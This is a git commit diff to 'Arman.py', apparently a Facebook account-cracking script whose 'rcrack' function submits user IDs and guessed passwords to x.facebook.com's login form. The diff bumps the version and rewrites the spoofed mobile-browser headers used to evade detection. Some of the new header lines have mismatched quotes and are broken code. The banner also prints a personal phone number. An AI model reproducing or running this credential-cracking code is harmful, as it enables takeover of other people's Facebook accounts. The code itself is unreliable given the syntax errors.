9ab686421d9af3e08f05fdeb6089439a645c45a9
Alyasskhan <133959200+Alyasskhan@users.noreply.github.com>
2023-05-28 19:40:39 +0430

    Add files via upload

--- Arman.py
+++ Arman.py
@@ -178,7 +178,7 @@ logo =                                          f"""{H}
 \033[1;31m\033[1;32m\033[1;32mFACEBOOK \033[1;31m\033[1;32m Raziqullah Saadat\033[1;31m 
 \033[1;31m\033[1;32m \033[1;32mGITHUB \033[1;31m \033[1;32m Arman\033[1;31m 
 \033[1;31m\033[1;32m\033[1;32mWHATSAPP \033[1;31m\033[1;32m +93702856593 \033[1;31m 
-\033[1;31m\033[1;32m\033[1;32m VERSION \033[1;31m \033[1;32m 0.01\033[1;31m 
+\033[1;31m\033[1;32m\033[1;32m VERSION \033[1;31m \033[1;32m 0.02\033[1;31m 
 \033[1;37mMESSENGER GROUP Saadat HACKERS{ M }\033[1;37m 
 \033[1;92m==========================================================
 \033[33;44m NAME Raziqullah Saadat \033[0;m
@@ -203,9 +203,9 @@ else:
     
 try:
     print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
-    v = 0.1
-    update = ('0.1')
-    update = ('0.1')
+    v = 0.2
+    update = ('0.2')
+    update = ('0.2')
     if str(v) in update:
         os.system('clear')
     else:pass
@@ -308,16 +308,19 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'x.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'method": 'post',
+    'scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    'referer': 'https://x.facebook.com/',
-    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
